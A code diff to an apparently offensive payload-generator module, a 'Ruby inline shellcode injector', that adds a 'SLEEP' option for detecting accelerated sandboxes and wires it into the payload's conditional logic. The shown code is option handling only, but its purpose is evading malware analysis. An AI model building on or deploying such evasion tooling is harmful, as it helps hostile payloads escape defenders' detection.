@@ -1,10 +1,6 @@
 """
-
 Ruby inline shellcode injector
-
 TODO: better randomization
-
-
 """
 
 from datetime import date
@@ -42,6 +38,7 @@ class PayloadModule:
             "HOSTNAME"       : ["X", "Optional: Only run on specified hostname"],
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
             "USERNAME"       : ["X", "Optional: The required user account"],
+            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
     def generate(self):
@@ -52,7 +49,7 @@ class PayloadModule:
 
         # Add logic for adding this line, stupid bug and I have no idea
         # why this is even a problem, but ruby is dumb
-        if self.required_options["EXPIRE_PAYLOAD"][0] != "X" or self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X" or self.required_options["USERNAME"][0] != "X":
+        if self.required_options["EXPIRE_PAYLOAD"][0] != "X" or self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X" or self.required_options["USERNAME"][0] != "X" or self.required_options["SLEEP"][0] != "X":
             pass
         else:
             payload_code += "exit if Object.const_defined?(:Ocra)\n"
